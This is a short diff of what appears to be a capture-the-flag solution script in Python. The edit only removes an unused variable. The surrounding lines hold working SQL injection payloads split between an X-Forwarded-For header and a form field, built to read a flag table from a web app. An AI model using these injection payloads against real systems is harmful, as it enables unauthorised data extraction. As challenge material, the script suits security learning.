@@ -143,7 +143,7 @@ import requests
 URL = "http://localhost:3000/"
 
 s = requests.Session()
-res = s.get(URL)
+s.get(URL)
 
 headers = {"X-Forwarded-For": "'/*"}
 data = {"secret": "*/, (select flag from flag)) --"}
@@ -187,7 +187,7 @@ URL = "http://localhost:3000/"
 # URL = "http://34.170.146.252:19956/"
 
 s = requests.Session()
-res = s.get(URL)
+s.get(URL)
 
 headers = {"X-Forwarded-For": "'/*"}
 data = {"secret": "*/ || '''', (select flag from flag)) --"}
